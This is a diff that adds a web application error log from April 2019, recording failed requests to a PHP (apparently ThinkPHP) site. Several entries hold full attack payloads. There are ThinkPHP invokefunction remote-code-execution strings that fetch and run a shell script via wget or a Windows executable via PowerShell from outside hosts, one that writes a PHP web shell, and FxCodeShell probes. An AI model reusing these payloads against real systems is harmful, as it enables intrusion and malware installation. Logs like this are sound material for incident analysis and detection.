@@ -1,0 +1,36 @@
+[ 2019-04-29T00:46:18+08:00 ] 182.92.240.15 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
+ERR: 无法加载模块:Index
+
+[ 2019-04-29T02:35:54+08:00 ] 27.115.124.6 /server-status
+ERR: 无法加载模块:Server-status
+
+[ 2019-04-29T03:44:52+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-04-29T13:52:25+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-04-29T16:47:34+08:00 ] 120.132.3.65 http://www.qq.com/404/search_children.js
+ERR: 无法加载模块:404
+
+[ 2019-04-29T21:16:07+08:00 ] 101.201.108.79 /FxCodeShell.jsp%20
+ERR: 无法加载模块:FxCodeShell
+
+[ 2019-04-29T21:16:07+08:00 ] 101.201.108.79 /FxCodeShell.jsp::$DATA
+ERR: 无法加载模块:FxCodeShell.jsp::$DATA
+
+[ 2019-04-29T21:16:07+08:00 ] 101.201.108.79 /FxCodeShell.jsp/
+ERR: 无法加载模块:FxCodeShell
+
+[ 2019-04-29T21:16:07+08:00 ] 101.201.108.79 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
+ERR: 无法加载模块:FxCodeShell
+
+[ 2019-04-29T23:05:09+08:00 ] 101.201.108.79 /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ggzlrfejuuffgfa16711.exe');start%20C:/Windows/temp/ggzlrfejuuffgfa16711.exe
+ERR: 无法加载模块:Index
+
+[ 2019-04-29T23:05:09+08:00 ] 101.201.108.79 /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+ERR: 无法加载模块:Index
+
+[ 2019-04-29T23:05:09+08:00 ] 101.201.108.79 /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ggzlrfejuuffgfa16711.exe');start%20C:/Windows/temp/ggzlrfejuuffgfa16711.exe
+ERR: 无法加载模块:Public
+
